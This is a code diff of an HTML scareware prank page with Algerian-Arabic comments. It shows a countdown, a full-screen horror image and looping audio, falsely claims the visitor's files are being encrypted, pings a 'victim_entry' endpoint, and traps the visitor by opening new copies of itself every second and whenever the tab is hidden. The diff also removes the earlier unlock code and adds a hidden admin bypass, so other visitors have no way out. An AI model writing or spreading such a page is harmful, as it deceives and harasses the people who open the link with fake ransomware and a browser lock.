@@ -1,91 +1,92 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ WARNING: SYSTEM_HIJACK ⚠️</title>
+    <title>⚠️ SYSTEM_UPDATE ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: crosshair; }
-        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
-        #timerBox { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
-        #count { font-size: 150px; font-weight: bold; text-shadow: 0 0 30px #f00; }
-        #textOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.95); padding: 30px; border: 3px solid #f00; display: none; width: 90%; }
-        input { background: #000; border: 1px solid #f00; color: #0f0; padding: 10px; text-align: center; margin-top: 15px; width: 80%; font-family: monospace; }
+        /* تعديل الصورة باش تولي كبيرة ومريقلة سواسوة */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        #horrorImg { 
+            position: fixed; top: 0; left: 0; 
+            width: 100vw; height: 100vh; 
+            object-fit: fill; /* هادي تخلي الصورة تعمر كامل الشاشة سواسوة */
+            z-index: 999; display: none; 
+        }
+        #clockContainer { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
+        #timer { font-size: 150px; font-weight: bold; }
+        #textOverlay { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
+            background: rgba(0,0,0,0.9); padding: 20px; border: 2px solid #f00; display: none; width: 90%; 
+        }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="startCountdown()">
+<body onclick="initiateSequence()">
 
-    <div id="timerBox">
-        <p class="blink" style="font-size: 20px;">ACCESSING CORE FILES...</p>
-        <div id="count">3</div>
+    <div id="clockContainer">
+        <div id="timer">03</div>
+        <p class="blink">CRITICAL_ERROR_DETECTED</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    <div id="textOverlay">
-        <h1 class="blink" style="font-size: 25px;">SYSTEM SECURED BY ALGE-HACKER</h1>
-        <p>لقد تم تشفير ملفاتك. لا يمكنك الهروب الآن.</p>
-        <hr style="border: 1px solid #f00;">
-        <p style="font-size: 14px; color: #0f0;">أدخل رمز فك القفل للمغادرة:</p>
-        <input type="text" id="unlockKey" placeholder="ENTER CODE" oninput="checkCode()">
-        <p id="errorMsg" style="color: #f00; font-size: 10px; margin-top: 10px; display: none;">INVALID CODE - ACCESS DENIED</p>
+    <div id="textOverlay" class="blink">
+        <h1>SYSTEM TERMINATED</h1>
+        <p>Your files are being encrypted. Do not close.</p>
     </div>
 
     <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
+        // ميزة الأدمن: إذا دخلت أنت بالرمز، الكود ما يخدمش فيك سواسوة
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('user') === 'admin_dz'; 
+
         let running = false;
-        let count = 3;
-        const SECRET_CODE = "1234"; // هادا هو الرمز اللي تمدهولوا أنت سواسوة
+        let timeLeft = 3;
         const audio = document.getElementById('sfx');
         const MY_LINK = window.location.href;
 
-        function startCountdown() {
+        function initiateSequence() {
+            if (isAdmin) {
+                alert("Welcome Admin! Virus is disabled for you سواسوة.");
+                return;
+            }
             if (running) return;
             running = true;
+            
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
 
-            let itv = setInterval(() => {
-                count--;
-                document.getElementById('count').innerText = count;
-                if (count <= 0) {
-                    clearInterval(itv);
-                    triggerBreach();
+            let countdown = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = "0" + timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    triggerHorror();
                 }
             }, 1000);
         }
 
-        function triggerBreach() {
-            document.getElementById('timerBox').style.display = 'none';
+        function triggerHorror() {
+            document.getElementById('clockContainer').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
             document.getElementById('textOverlay').style.display = 'block';
-            
-            audio.volume = 1.0;
             audio.play();
-            audio.onended = () => { if(running) setTimeout(() => { audio.play(); }, 4000); };
 
-            // ميزة الحبس الإجباري سواسوة
-            window.trap = setInterval(() => {
-                window.open(MY_LINK, '_blank', 'width=10,height=10');
-            }, 1500);
+            // الحبس التلقائي للضحية فقط سواسوة
+            setInterval(() => {
+                window.open(MY_LINK, '_blank');
+            }, 1000);
         }
 
-        function checkCode() {
-            let input = document.getElementById('unlockKey').value;
-            if (input === SECRET_CODE) {
-                running = false;
-                clearInterval(window.trap);
-                alert("تم فك القفل. يمكنك الرحيل الآن سواسوة.");
-                location.href = "https://www.google.com";
-            } else if (input.length >= 4) {
-                document.getElementById('errorMsg').style.display = 'block';
+        // منع الخروج للضحية فقط سواسوة
+        document.addEventListener("visibilitychange", () => {
+            if (!isAdmin && document.visibilityState === 'hidden' && running) {
+                window.open(MY_LINK, '_blank');
             }
-        }
-
-        // منع الهروب سواسوة
-        window.onbeforeunload = () => "الملفات في خطر!";
-        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && running) window.open(MY_LINK, '_blank'); });
+        });
     </script>
 </body>
 </html>
